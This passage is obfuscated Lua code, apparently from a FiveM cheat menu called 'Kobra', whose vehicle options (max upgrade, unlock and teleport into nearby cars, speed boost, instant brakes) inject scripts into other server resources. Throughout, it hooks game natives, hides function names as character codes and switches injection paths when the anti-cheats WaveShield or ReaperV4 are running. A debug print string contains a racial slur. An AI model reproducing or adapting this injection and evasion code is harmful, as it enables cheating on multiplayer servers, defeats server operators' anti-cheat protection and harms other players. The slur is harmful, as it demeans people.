                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() local v448=0 + 0 ;local v449;local v450;while true do if (v448==1) then v450=GetResourceState("ReaperV4")=="started" ;if v449 then local v865=0 -0 ;while true do if (v865==(0 -0)) then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);break;end end elseif v450 then print("using Reaper fallback");MachoInjectThread(1777 -(1263 + 514) ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end break;end if (v448==(497 -(73 + 424))) then v12:Notify("success","Kobra","Vehicle Max Upgraded",7898 -4898 );v449=GetResourceState("WaveShield")=="started" ;v448=1;end end end},{type="button",label="Delete Vehicle",onSelect=function() local v451=0;while true do if (v451==(0 -0)) then v12:Notify("success","Kobra","Deleted Vehicle",4935 -(1756 + 179) );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() local v452=107 -(57 + 50) ;while true do if (v452==(629 -(30 + 599))) then v12:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);break;end end end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() local v453=0;while true do if (v453==0) then v12:Notify("success","Kobra","Teleported into Vehicle",3000);MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);break;end end end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v454) if v454 then local v603=918 -(794 + 124) ;while true do if ((0 + 0)==v603) then v12:Notify("success","Kobra","Boost Vehicle On",412 + 2588 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end break;end end else local v604=0;while true do if (v604==(0 -0)) then v12:Notify("error","Kobra","Boost Vehicle Off",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v48("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v455) local v456=1927 -(1299 + 628) ;local v457;local v458;while true do if (v456==(0 -0)) then v457=GetResourceState("WaveShield")=="started" ;v458=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v456=1;end if (v456==(2 -1)) then if v455 then if v457 then local v979=0 + 0 ;while true do if (v979==(0 -0)) then v12:Notify("success","Kobra","Instant Brakes On",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v980=0;while true do if (v980==0) then v48(v458,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",3000);break;end end end elseif v457 then local v981=1445 -(335 + 1110) ;while true do if (v981==(0 + 0)) then v12:Notify("success","Kobra","Instant Brakes Off",9879 -6879 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else v48(v458,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",5353 -2353 );end break;end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v459) local v460=0 + 0 ;local v461;local v462;while true do if (v460==(1278 -(243 + 1035))) then v461=GetResourceState("WaveShield")=="started" ;v462=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v460=2 -1 ;end if (v460==1) then if v459 then if v461 then local v982=0 -0 ;while true do if (v982==0) then v12:Notify("success","Kobra","Easy Handling On",12737 -9737 );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v983=0;while true do if (v983==(0 + 0)) then v48(v462,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",2643 + 357 );break;end end end elseif v461 then v12:Notify("success","Kobra","Easy Handling Off",3702 -702 );MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else local v984=100 -(90 + 10) ;while true do if (v984==(804 -(209 + 595))) then v48(v462,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3805 -(603 + 202) );break;end end end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v463) local v464=0;local v465;while true do if (v464==0) then v465=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v463 then local v866=0 -0 ;while true do if ((0 + 0)==v866) then v12:Notify("success","Kobra","Rainbow Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then local v1224=0 -0 ;while true do if (v1224==(0 + 0)) then print("souygdfg");v48(v465,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);break;end end else v48(v465,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

